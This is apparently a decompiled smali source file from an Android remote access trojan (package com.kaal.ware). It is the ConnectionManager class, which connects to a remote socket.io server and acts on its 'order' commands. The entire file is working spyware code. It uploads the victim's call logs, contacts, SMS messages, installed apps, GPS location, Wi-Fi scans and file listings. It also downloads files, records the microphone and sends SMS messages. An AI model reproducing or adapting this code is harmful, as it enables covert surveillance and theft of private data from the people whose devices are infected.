.class public Lcom/kaal/ware/ConnectionManager;
.super Ljava/lang/Object;
.source "ConnectionManager.java"


# static fields
.field public static context:Landroid/content/Context;

.field private static fm:Lcom/kaal/ware/FileManager;

.field private static ioSocket:Lio/socket/client/Socket;


# direct methods
.method static constructor <clinit>()V
    .registers 1

    .line 17
    new-instance v0, Lcom/kaal/ware/FileManager;

    invoke-direct {v0}, Lcom/kaal/ware/FileManager;-><init>()V

    sput-object v0, Lcom/kaal/ware/ConnectionManager;->fm:Lcom/kaal/ware/FileManager;

    return-void
.end method

.method public constructor <init>()V
    .registers 1

    .line 12
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static CL()V
    .registers 4

    .line 142
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/kaal/ware/CallsManager;->getCallsLogs()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xCL"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 143
    return-void
.end method

.method public static CO()V
    .registers 4

    .line 146
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/kaal/ware/ContactsManager;->getContacts()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xCO"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 147
    return-void
.end method

.method public static FI(ILjava/lang/String;)V
    .registers 7
    .param p0, "req"    # I
    .param p1, "path"    # Ljava/lang/String;

    .line 120
    const-string v0, "list"

    const/4 v1, 0x1

    if-nez p0, :cond_27

    .line 121
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 123
    .local v2, "object":Lorg/json/JSONObject;
    :try_start_a
    const-string v3, "type"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 124
    sget-object v3, Lcom/kaal/ware/ConnectionManager;->fm:Lcom/kaal/ware/FileManager;

    invoke-static {p1}, Lcom/kaal/ware/FileManager;->walk(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    invoke-virtual {v2, v0, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 125
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v3, "0xFI"

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v2, v1, v4

    invoke-virtual {v0, v3, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_24
    .catch Lorg/json/JSONException; {:try_start_a .. :try_end_24} :catch_25

    goto :goto_26

    .line 126
    :catch_25
    move-exception v0

    :goto_26
    goto :goto_2f

    .line 127
    .end local v2    # "object":Lorg/json/JSONObject;
    :cond_27
    if-ne p0, v1, :cond_2f

    .line 128
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->fm:Lcom/kaal/ware/FileManager;

    invoke-static {p1}, Lcom/kaal/ware/FileManager;->downloadFile(Ljava/lang/String;)V

    goto :goto_30

    .line 127
    :cond_2f
    :goto_2f
    nop

    .line 129
    :goto_30
    return-void
.end method

.method public static GP(Ljava/lang/String;)V
    .registers 6
    .param p0, "perm"    # Ljava/lang/String;

    .line 168
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 170
    .local v0, "data":Lorg/json/JSONObject;
    :try_start_5
    const-string v1, "permission"

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 171
    const-string v1, "isAllowed"

    invoke-static {p0}, Lcom/kaal/ware/PermissionManager;->canIUse(Ljava/lang/String;)Z

    move-result v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 172
    sget-object v1, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v2, "0xGP"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-virtual {v1, v2, v3}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;
    :try_end_20
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_20} :catch_21

    .line 175
    goto :goto_22

    .line 173
    :catch_21
    move-exception v1

    .line 176
    :goto_22
    return-void
.end method

.method public static IN()V
    .registers 4

    .line 163
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    const/4 v2, 0x0

    invoke-static {v2}, Lcom/kaal/ware/AppList;->getInstalledApps(Z)Lorg/json/JSONObject;

    move-result-object v3

    aput-object v3, v1, v2

    const-string v2, "0xIN"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 164
    return-void
.end method

.method public static LO()V
    .registers 5
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 179
    invoke-static {}, Landroid/os/Looper;->prepare()V

    .line 180
    new-instance v0, Lcom/kaal/ware/LocManager;

    sget-object v1, Lcom/kaal/ware/ConnectionManager;->context:Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/kaal/ware/LocManager;-><init>(Landroid/content/Context;)V

    .line 182
    .local v0, "gps":Lcom/kaal/ware/LocManager;
    invoke-virtual {v0}, Lcom/kaal/ware/LocManager;->canGetLocation()Z

    move-result v1

    if-eqz v1, :cond_21

    .line 183
    sget-object v1, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    invoke-virtual {v0}, Lcom/kaal/ware/LocManager;->getData()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v3

    const-string v3, "0xLO"

    invoke-virtual {v1, v3, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 185
    :cond_21
    return-void
.end method

.method public static MI(I)V
    .registers 1
    .param p0, "sec"    # I
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 150
    invoke-static {p0}, Lcom/kaal/ware/MicManager;->startRecording(I)V

    .line 151
    return-void
.end method

.method public static PM()V
    .registers 4

    .line 158
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    invoke-static {}, Lcom/kaal/ware/PermissionManager;->getGrantedPermissions()Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xPM"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 159
    return-void
.end method

.method public static SM(ILjava/lang/String;Ljava/lang/String;)V
    .registers 9
    .param p0, "req"    # I
    .param p1, "phoneNo"    # Ljava/lang/String;
    .param p2, "msg"    # Ljava/lang/String;

    .line 133
    const/4 v0, 0x0

    const-string v1, "0xSM"

    const/4 v2, 0x1

    if-nez p0, :cond_14

    .line 134
    sget-object v3, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {}, Lcom/kaal/ware/SMSManager;->getsms()Lorg/json/JSONObject;

    move-result-object v4

    aput-object v4, v2, v0

    invoke-virtual {v3, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    goto :goto_27

    .line 135
    :cond_14
    if-ne p0, v2, :cond_27

    .line 136
    invoke-static {p1, p2}, Lcom/kaal/ware/SMSManager;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    .line 137
    .local v3, "isSent":Z
    sget-object v4, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    new-array v2, v2, [Ljava/lang/Object;

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v2, v0

    invoke-virtual {v4, v1, v2}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 139
    .end local v3    # "isSent":Z
    :cond_27
    :goto_27
    return-void
.end method

.method public static WI()V
    .registers 4

    .line 154
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const/4 v1, 0x1

    new-array v1, v1, [Ljava/lang/Object;

    sget-object v2, Lcom/kaal/ware/ConnectionManager;->context:Landroid/content/Context;

    invoke-static {v2}, Lcom/kaal/ware/WifiScanner;->scan(Landroid/content/Context;)Lorg/json/JSONObject;

    move-result-object v2

    const/4 v3, 0x0

    aput-object v2, v1, v3

    const-string v2, "0xWI"

    invoke-virtual {v0, v2, v1}, Lio/socket/client/Socket;->emit(Ljava/lang/String;[Ljava/lang/Object;)Lio/socket/emitter/Emitter;

    .line 155
    return-void
.end method

.method static synthetic access$000()Lio/socket/client/Socket;
    .registers 1

    .line 12
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    return-object v0
.end method

.method public static sendReq()V
    .registers 3

    .line 32
    :try_start_0
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    if-eqz v0, :cond_5

    .line 33
    return-void

    .line 34
    :cond_5
    invoke-static {}, Lcom/kaal/ware/IOSocket;->getInstance()Lcom/kaal/ware/IOSocket;

    move-result-object v0

    invoke-virtual {v0}, Lcom/kaal/ware/IOSocket;->getIoSocket()Lio/socket/client/Socket;

    move-result-object v0

    sput-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    .line 35
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "ping"

    new-instance v2, Lcom/kaal/ware/ConnectionManager$1;

    invoke-direct {v2}, Lcom/kaal/ware/ConnectionManager$1;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 44
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    const-string v1, "order"

    new-instance v2, Lcom/kaal/ware/ConnectionManager$2;

    invoke-direct {v2}, Lcom/kaal/ware/ConnectionManager$2;-><init>()V

    invoke-virtual {v0, v1, v2}, Lio/socket/client/Socket;->on(Ljava/lang/String;Lio/socket/emitter/Emitter$Listener;)Lio/socket/emitter/Emitter;

    .line 101
    sget-object v0, Lcom/kaal/ware/ConnectionManager;->ioSocket:Lio/socket/client/Socket;

    invoke-virtual {v0}, Lio/socket/client/Socket;->connect()Lio/socket/client/Socket;
    :try_end_2c
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_2c} :catch_2d

    .line 105
    goto :goto_37

    .line 103
    :catch_2d
    move-exception v0

    .line 104
    .local v0, "ex":Ljava/lang/Exception;
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    const-string v2, "error"

    invoke-static {v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 107
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_37
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .registers 2
    .param p0, "con"    # Landroid/content/Context;

    .line 22
    :try_start_0
    sput-object p0, Lcom/kaal/ware/ConnectionManager;->context:Landroid/content/Context;

    .line 23
    invoke-static {}, Lcom/kaal/ware/ConnectionManager;->sendReq()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_5} :catch_6

    .line 26
    goto :goto_a

    .line 24
    :catch_6
    move-exception v0

    .line 25
    .local v0, "ex":Ljava/lang/Exception;
    invoke-static {p0}, Lcom/kaal/ware/ConnectionManager;->startAsync(Landroid/content/Context;)V

    .line 28
    .end local v0    # "ex":Ljava/lang/Exception;
    :goto_a
    return-void
.end method
